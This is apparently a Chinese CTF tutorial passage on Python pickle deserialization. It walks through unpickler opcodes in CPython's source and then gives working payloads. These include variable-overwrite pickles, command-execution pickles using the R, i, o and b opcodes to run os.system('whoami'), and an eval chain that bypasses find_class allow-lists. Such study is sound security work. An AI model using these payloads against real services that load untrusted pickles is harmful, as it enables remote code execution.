class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_binput(self):    i &#x3D; self.read(1)[0]#继续读取下一个字节，赋值给i    if i &lt; 0:        raise ValueError(&quot;negative BINPUT argument&quot;)    self.memo[i] &#x3D; self.stack[-1]#将栈中的栈尾(与栈顶相对)存入记忆栈中memodispatch[BINPUT[0]] &#x3D; load_binput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将animal对象存储到memo[1]的栈中，所以当前的memo栈有：</p><pre class="line-numbers language-none"><code class="language-none">memo&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(类) , &lt;class &#39;__main__.animal&#39;&gt;(对象)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第六步在读取 <code>&#125;</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_empty_dictionary(self):    self.append(&#123;&#125;) dispatch[EMPTY_DICT[0]] &#x3D; load_empty_dictionary<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将animal对象存储到memo[1]的栈中，所以当前的memo栈有：</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(对象),&#123;&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第七步在读取 <code>q</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_binput(self):    i &#x3D; self.read(1)[0]#继续读取下一个字节 \x02 ，赋值给i    if i &lt; 0:        raise ValueError(&quot;negative BINPUT argument&quot;)    self.memo[i] &#x3D; self.stack[-1]#将栈中的栈尾栈顶存入记忆栈中memodispatch[BINPUT[0]] &#x3D; load_binput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将animal对象存储到memo[1]的栈中，所以当前的memo栈有：</p><pre class="line-numbers language-none"><code class="language-none">memo&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(类) , &lt;class &#39;__main__.animal&#39;&gt;(对象),&#123;&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第八步在读取 <code>X</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_binunicode(self):    len, &#x3D; unpack(&#39;&lt;I&#39;, self.read(4))#w往后读四个字节表示长度 \x06\x00\x00\x00 &#x3D;&gt;6    if len &gt; maxsize:        raise UnpicklingError(&quot;BINUNICODE exceeds system&#39;s maximum size &quot;                              &quot;of %d bytes&quot; % maxsize)    self.append(str(self.read(len), &#39;utf-8&#39;, &#39;surrogatepass&#39;))    #再往后读len长度的字节数 animal（属性名） 然后存入到栈中中dispatch[BINUNICODE[0]] &#x3D; load_binunicode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将animal（属性名） 然后存入到字符串中</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(对象),&#123;&#125;,&quot;animal&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第九步在读取 <code>q</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_binput(self):        i &#x3D; self.read(1)[0]#继续读取下一个字节 \x03 ，赋值给i        if i &lt; 0:            raise ValueError(&quot;negative BINPUT argument&quot;)        self.memo[i] &#x3D; self.stack[-1]#将栈中的栈尾栈顶存入记忆栈中memo    dispatch[BINPUT[0]] &#x3D; load_binput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将animal（属性名） 然后存入到字符串中</p><pre class="line-numbers language-none"><code class="language-none">memo&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(类) , &lt;class &#39;__main__.animal&#39;&gt;(对象),&#123;&#125;,&quot;animal&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第十步在读取 <code>X</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_binunicode(self):    len, &#x3D; unpack(&#39;&lt;I&#39;, self.read(4))#w往后读四个字节表示长度 \x03\x00\x00\x00&#x3D;&gt; 3    if len &gt; maxsize:        raise UnpicklingError(&quot;BINUNICODE exceeds system&#39;s maximum size &quot;                              &quot;of %d bytes&quot; % maxsize)    self.append(str(self.read(len), &#39;utf-8&#39;, &#39;surrogatepass&#39;)) dog    #再往后读len长度的字节数 dog（属性值） 然后存入到栈中中dispatch[BINUNICODE[0]] &#x3D; load_binunicode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将animal（属性名） 然后存入到字符串中</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(对象),&#123;&#125;,&quot;animal&quot;,&quot;dog&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第十一步在读取 <code>q</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_binput(self):        i &#x3D; self.read(1)[0]#继续读取下一个字节 \x04 ，赋值给i        if i &lt; 0:            raise ValueError(&quot;negative BINPUT argument&quot;)        self.memo[i] &#x3D; self.stack[-1]#将栈中的栈尾栈顶存入记忆栈中memo    dispatch[BINPUT[0]] &#x3D; load_binput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将animal（属性名） 然后存入到字符串中</p><pre class="line-numbers language-none"><code class="language-none">memo&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(类) , &lt;class &#39;__main__.animal&#39;&gt;(对象),&#123;&#125;,&quot;animal&quot;,&quot;dog&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第十二步在读取 <code>s</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_setitem(self):    stack &#x3D; self.stack    value &#x3D; stack.pop()  #&quot;dog&quot;    key &#x3D; stack.pop()   #&quot;animal&quot;    dict &#x3D; stack[-1]    #栈顶&#123;&#125;    dict[key] &#x3D; value   #&#123;&quot;animal&quot;:&quot;dog&quot;&#125;dispatch[SETITEM[0]] &#x3D; load_setitem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将animal（属性名） 然后存入到字符串中</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(对象),&#123;&quot;animal&quot;:&quot;dog&quot;&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第十二步在读取 <code>b</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_build(self):    stack &#x3D; self.stack    state &#x3D; stack.pop() #&#123;&quot;animal&quot;:&quot;dog&quot;&#125;    inst &#x3D; stack[-1] #&lt;class &#39;__main__.animal&#39;&gt;(对象)    setstate &#x3D; getattr(inst, &quot;__setstate__&quot;, None)     if setstate is not None:         #检查是否存在 __setstate__ 方法 一般是不存在的        ###############################################        setstate(state) ###########会造成任意函数调用        ############################################        return    slotstate &#x3D; None    if isinstance(state, tuple) and len(state) &#x3D;&#x3D; 2:        state, slotstate &#x3D; state    if state:        inst_dict &#x3D; inst.__dict__        intern &#x3D; sys.intern        for k, v in state.items():            if type(k) is str:                inst_dict[intern(k)] &#x3D; v            else:                inst_dict[k] &#x3D; v    if slotstate:        for k, v in slotstate.items():            setattr(inst, k, v)dispatch[BUILD[0]] &#x3D; load_build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将animal（属性名） 然后存入到字符串中</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(拥有数据的对象)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第十三步在读取 <code>.</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_stop(self):    value &#x3D; self.stack.pop()    raise _Stop(value)dispatch[STOP[0]] &#x3D; load_stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>反序列结束</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="全局变量引入"><a href="#全局变量引入" class="headerlink" title="全局变量引入"></a>全局变量引入</h3><p>在碰到<strong>s操作码时，会弹出两个字符串作为键值对保存在字典中</strong>，我们可以通过<strong>c操作码来得到secret.best</strong>，再使animal&#x3D;secret.best，这样就成功引入了全局变量</p><p>c操作码中 find_class ：</p><pre class="line-numbers language-none"><code class="language-none">def load_global(self):    module &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;)    name &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;)    klass &#x3D; self.find_class(module, name)    self.append(klass)dispatch[GLOBAL[0]] &#x3D; load_global<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>find_class 中的 getattr是通过 sys.modules获取变量名的或者模块的</p><p>secret也存在与sys.modules的字典中，所以 <code>module=secret&amp;name=best</code>就可以去到 secret.best的值</p><pre class="line-numbers language-none"><code class="language-none">def find_class(self, module, name):    # Subclasses may override this.    sys.audit(&#39;pickle.find_class&#39;, module, name)    if self.proto &lt; 3 and self.fix_imports:        if (module, name) in _compat_pickle.NAME_MAPPING:            module, name &#x3D; _compat_pickle.NAME_MAPPING[(module, name)]        elif module in _compat_pickle.IMPORT_MAPPING:            module &#x3D; _compat_pickle.IMPORT_MAPPING[module]    __import__(module, level&#x3D;0)    if self.proto &gt;&#x3D; 4:        return _getattribute(sys.modules[module], name)[0]    else:#3号协议        return getattr(sys.modules[module], name)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>于是就</code>可以将animal的值改为全局变量&#96;&#96;&#96;中的secret.best</p><pre class="line-numbers language-none"><code class="language-none">import pickleimport sysimport secretclass animal:    def __init__(self):        self.animal&#x3D;&quot;dog&quot;    def check(self):        if self.animal &#x3D;&#x3D;secret.best:            print(self.animal)            print(&#39;good&#39;)# print(sys.modules)# a&#x3D;pickle.dumps(animal(),protocol&#x3D;3)#b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;a&#x3D;b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03csecret\nbest\nq\x04sb.&#39;print(a)b&#x3D;pickle.loads(a)b.check()# cat# good<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改全局变量"><a href="#修改全局变量" class="headerlink" title="修改全局变量"></a>修改全局变量</h3><p><code>c</code>操作码是通过调用<code>find_class</code>方法来获取对象，而<code>find_class</code>使用<code>_getattribute(sys.modules[module],name)</code>最终使用<code>getattr(sys.modules[&#39;__main__&#39;],&#39;secret&#39;)</code>来获取到相应的属性，<code>sys.modules</code>是一个全局字典，该字典是python启动后就加载在内存中的。每导入新的模块、<code>sys.modules</code>会将该模块导入字典中。</p><pre class="line-numbers language-none"><code class="language-none">print(getattr(sys.modules[&#39;__main__&#39;],&#39;secret&#39;))#&lt;module &#39;secret&#39; from &#39;D:\\newDesktop\\CTFWEB\\pickle反序列化\\secret.py&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用<code>c</code>操作码通过<code>__main__</code>模块索引secret模块，然后使用<code>&#125; X s</code>等操作码构成<code>&#123;&quot;best&quot;:&quot;binbin&quot;&#125;</code></p><p>最后栈中剩下</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt;[secret(模块),&#123;&quot;best&quot;:&quot;binbin&quot;&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用<code>b</code>操作符，就可以修改secret模块中的beat</p><pre class="line-numbers language-none"><code class="language-none">import pickleimport sysimport secretclass animal:    def __init__(self):        self.animal&#x3D;&quot;dog&quot;    def check(self):        if self.animal &#x3D;&#x3D;secret.best:            print(self.animal)            print(&#39;good&#39;)        else:            print(&#39;no&#39;)# print(sys.modules)# a&#x3D;pickle.dumps(animal(),protocol&#x3D;3)# print(sys.modules[&#39;__main__&#39;])#b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;a&#x3D;b&#39;&#39;&#39;\x80\x03c__main__\nsecret\nq\x00&#125;q\x01X\x04\x00\x00\x00bestq\x02X\x06\x00\x00\x00binbinq\x03sbc__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;&#39;&#39;#a&#x3D;b&#39;&#39;&#39;\x80\x03c__main__\nsecret\n&#125;X\x04\x00\x00\x00bestX\x06\x00\x00\x00binbinq\x03sb.&#39;&#39;&#39;#可以去掉所有q\01这类东西，因为q只是加入记忆栈，记录反序列化过程# print(a)b&#x3D;pickle.loads(a)b.check()print(secret.best)# no# binbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h3><p>与函数执行相关的操作码有<code>R,i,o,b</code></p><p>在来普及一下其他操作码：</p><h3 id="c操作码"><a href="#c操作码" class="headerlink" title="c操作码"></a><code>c</code>操作码</h3><p>获取一个全局对象或import一个模块（注：<strong>会调用import语句，能够引入新的包</strong>）会<strong>加入self.stack</strong></p><pre class="line-numbers language-none"><code class="language-none">b&#39;cbuiltins\ngetattr\n&#39;   &#x3D;&#x3D;&#x3D;&gt;   __import__(&#39;builtins&#39;).getattr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="p操作码"><a href="#p操作码" class="headerlink" title="p操作码"></a><code>p</code>操作码</h3><p>将(self.stack)栈顶对象储存至memo_n（记忆栈）</p><pre class="line-numbers language-none"><code class="language-none">b&#39;p2&#x2F;n&#39; &#x3D;&gt; #将栈顶对象储存至memo[2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="操作码"><a href="#操作码" class="headerlink" title="(操作码"></a><code>(</code>操作码</h3><p>向栈(self.stack)中插入一个merk标记</p><h3 id="g操作码"><a href="#g操作码" class="headerlink" title="g操作码"></a><code>g</code>操作码</h3><p>将memo_n的对象压栈（self.stack）</p><h3 id="0操作码"><a href="#0操作码" class="headerlink" title="0操作码"></a><code>0</code>操作码</h3><p>丢弃栈顶对象（self.stack）</p><h3 id="S操作码"><a href="#S操作码" class="headerlink" title="S操作码"></a><code>S</code>操作码</h3><p>  <code>S&#39;xxx&#39;\n</code>（也可以使用双引号、’等python字符串形式）等效于 <code>X\x06\x00\x00\x00whoami</code></p><p>其他可以看上面的表格</p><h3 id="i操作码"><a href="#i操作码" class="headerlink" title="i操作码"></a><code>i</code>操作码</h3><p>对应的函数</p><pre class="line-numbers language-none"><code class="language-none">def load_inst(self):    module &#x3D; self.readline()[:-1].decode(&quot;ascii&quot;) #取出一行（读到写一个\n）作为模块值    name &#x3D; self.readline()[:-1].decode(&quot;ascii&quot;) #取出一行（读到写一个\n）作为属性名    klass &#x3D; self.find_class(module, name)  #获取module模块的属性值    self._instantiate(klass, self.pop_mark())dispatch[INST[0]] &#x3D; load_inst<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>_instantiate函数 调用函数</p><pre class="line-numbers language-none"><code class="language-none">def _instantiate(self, klass, args):    if (args or not isinstance(klass, type) or        hasattr(klass, &quot;__getinitargs__&quot;)):        try:            value &#x3D; klass(*args) #执行        except TypeError as err:            raise TypeError(&quot;in constructor for %s: %s&quot; %                            (klass.__name__, str(err)), sys.exc_info()[2])    else:        value &#x3D; klass.__new__(klass)    self.append(value)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>load_inst</code>中的<code>self.pop_mark()</code>作为参数</p><pre class="line-numbers language-none"><code class="language-none">def pop_mark(self):    items &#x3D; self.stack #返回当前栈中的参数    self.stack &#x3D; self.metastack.pop()    self.append &#x3D; self.stack.append    return items #返回当前栈中的参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以命令执行的payload</p><pre class="line-numbers language-none"><code class="language-none">import pickleimport sysa&#x3D;b&#39;\x80\x03(X\x06\x00\x00\x00whoamiios\nsystem\n.&#39;b&#x3D;pickle.loads(a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>(</code>操作码 向<code>metastack</code>中添加<code>self.stack</code>不然后面命令执行时<code>self.metastack.pop()</code>会报错</p><pre class="line-numbers language-none"><code class="language-none">def load_mark(self):    self.metastack.append(self.stack)    self.stack &#x3D; []    self.append &#x3D; self.stack.appenddispatch[MARK[0]] &#x3D; load_mark<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="R操作码"><a href="#R操作码" class="headerlink" title="R操作码"></a><code>R</code>操作码</h3><p>对应的函数</p><pre class="line-numbers language-none"><code class="language-none">    def load_reduce(self):        stack &#x3D; self.stack        args &#x3D; stack.pop() #弹栈作为一个参数，参数必须是元组        func &#x3D; stack[-1]# 栈中的最后一个数据作为函数，        stack[-1] &#x3D; func(*args)#并用执行结果覆盖函数    dispatch[REDUCE[0]] &#x3D; load_reduceself&#x3D;&gt; stack:[&lt;built -in function system&gt;,(whoami)]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功执行<code>os.system(&#39;whoami&#39;)</code></p><p>由于弹栈作为一个参数，参数必须是元组，所以使用操作码<code>\x85</code>,将栈顶的一个元素转化为tuple类型的数据</p><pre class="line-numbers language-none"><code class="language-none">def load_tuple1(self):    self.stack[-1] &#x3D; (self.stack[-1],)dispatch[TUPLE1[0]] &#x3D; load_tuple1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">import picklea&#x3D;b&#39;\x80\x03cos\nsystem\nX\x06\x00\x00\x00whoami\x85R.&#39;b&#x3D;pickle.loads(a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="o操作码"><a href="#o操作码" class="headerlink" title="o操作码"></a><code>o</code>操作码</h3><pre class="line-numbers language-none"><code class="language-none">def load_obj(self):    # Stack is ... markobject classobject arg1 arg2 ...    args &#x3D; self.pop_mark() #当前栈中所有的数据赋值给args    cls &#x3D; args.pop(0) #弹出第一个，作为类名 利用是为函数名    self._instantiate(cls, args)dispatch[OBJ[0]] &#x3D; load_obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数执行在value &#x3D; klass(*args)</p><pre class="line-numbers language-none"><code class="language-none">def _instantiate(self, klass, args):    if (args or not isinstance(klass, type) or        hasattr(klass, &quot;__getinitargs__&quot;)):        try:            value &#x3D; klass(*args)        except TypeError as err:            raise TypeError(&quot;in constructor for %s: %s&quot; %                            (klass.__name__, str(err)), sys.exc_info()[2])    else:        value &#x3D; klass.__new__(klass)    self.append(value)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">import pickleimport sysa&#x3D;b&#39;\x80\x03(cos\nsystem\nX\x06\x00\x00\x00whoamio.&#39;#a&#x3D;b&#39;(cos\nsystem\nX\x06\x00\x00\x00whoamio.&#39;b&#x3D;pickle.loads(a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="b操作码"><a href="#b操作码" class="headerlink" title="b操作码"></a><code>b</code>操作码</h3><p>执行函数</p><pre class="line-numbers language-none"><code class="language-none">def load_build(self):    stack &#x3D; self.stack    state &#x3D; stack.pop() #&#123;&quot;animal&quot;:&quot;dog&quot;&#125;    inst &#x3D; stack[-1] #&lt;class &#39;__main__.animal&#39;&gt;(对象)    setstate &#x3D; getattr(inst, &quot;__setstate__&quot;, None)     if setstate is not None:         #检查是否存在 __setstate__ 方法 一般是不存在的        #如果存在__setstate__方法，就会调用setstate(state)        ###############################################        setstate(state) ###########会造成任意函数调用        ############################################        return    slotstate &#x3D; None    if isinstance(state, tuple) and len(state) &#x3D;&#x3D; 2:        state, slotstate &#x3D; state    if state:        inst_dict &#x3D; inst.__dict__        intern &#x3D; sys.intern        for k, v in state.items():            if type(k) is str:                inst_dict[intern(k)] &#x3D; v            else:                inst_dict[k] &#x3D; v    if slotstate:        for k, v in slotstate.items():            setattr(inst, k, v)dispatch[BUILD[0]] &#x3D; load_build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有存在<code>__setstate__</code>方法，就会调用<code>setstate(state)</code>，所以要构造一个含有<code>__setstate__</code>的类</p><pre class="line-numbers language-none"><code class="language-none">import pickleclass animal:    def __init__(self):        self.animal&#x3D;&quot;dog&quot;a&#x3D;b&#39;\x80\x03c__main__\nanimal\n)\x81&#125;X\x0C\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.&#39;b&#x3D;pickle.loads(a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p> 官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。 </p><ol><li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>\x93</code>时，会调用，<strong>所以只要在这三个opcode直接引入模块时没有违反规则即可</strong>。</li><li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，<strong>所以可以通过<code>__import__</code>绕过一些黑名单。</strong></li></ol><p>下面是官方文档中的例子，使用白名单限制了能够调用的模块</p><pre class="line-numbers language-none"><code class="language-none">safe_builtins &#x3D; &#123;&#39;range&#39;,&#39;complex&#39;,&#39;set&#39;,&#39;frozenset&#39;,&#39;slice&#39;,&#125;class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module &#x3D;&#x3D; &quot;builtins&quot; and name in safe_builtins:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %(module, name))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许<code>__main__</code>模块。虽然看起来很安全，但是被引入主程序的模块都可以通过<code>__main__</code>调用修改，所以造成了变量覆盖。 </p><pre class="line-numbers language-none"><code class="language-none">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module &#x3D;&#x3D; &#39;__main__&#39;: # 只允许__main__模块            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 如何绕过<code>find_class</code>函数内的限制就是pickle反序列化解题的关键 </p><p>黑名单绕过</p><p>构造getattr函数</p><p>可以使用builtins模块构造getattr函数，不再经过find_class,就能绕过WAF实现任意函数执行</p><h3 id="不经过find-class"><a href="#不经过find-class" class="headerlink" title="不经过find_class"></a>不经过find_class</h3><p>绕过在find_class中的限制</p><p>使用<code>R</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">#1、下面字符串中#号后面的字符要删除，不然会报错a&#x3D;b&#39;&#39;&#39;cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00get\x86Rp2\n0g2\ncbuiltins\nglobals\n)RX\x0C\x00\x00\x00__builtins__\x86Rp3\n0g0\ng3\nX\x04\x00\x00\x00eval\x86Rp4\n0g4\nX\x21\x00\x00\x00__import__(&#39;os&#39;).system(&#39;whoami&#39;)\x85R.&#39;&#39;&#39;b&#x3D;b&#39;&#39;&#39;cbuiltinsgetattrp0 (cbuiltinsdictS&#39;get&#39;tRp1cbuiltinsglobals)Rp200g1(g2S&#39;__builtins__&#39;tRp30g0(g3S&#39;eval&#39;tR(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;tR.&#39;&#39;&#39;#都等价于下面的代码getattr &#x3D; __import__(&#39;builtins&#39;).getattrdict &#x3D; __import__(&#39;builtins&#39;).dictget &#x3D; getattr(dict, &#39;get&#39;)__builtins__&#x3D;get(__import__(&#39;builtins&#39;).globals(), &#39;__builtins__&#39;)eval &#x3D; getattr(__builtins__, &#39;eval&#39;)eval(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)#注意#只可通过__import__来导入对象，所以获取__builtins__中的对象需要__import__(&#39;builtins&#39;).xx（Python2中是__builtin__）#由上一条，虽然__import__转手了__builtins__，但无法获取，还是得通过globals()[&#39;__builtins__&#39;]获取#字典无法直接取值，需获取到dict的类方法get，传dict实例和key进去<span aria-hidden="true" 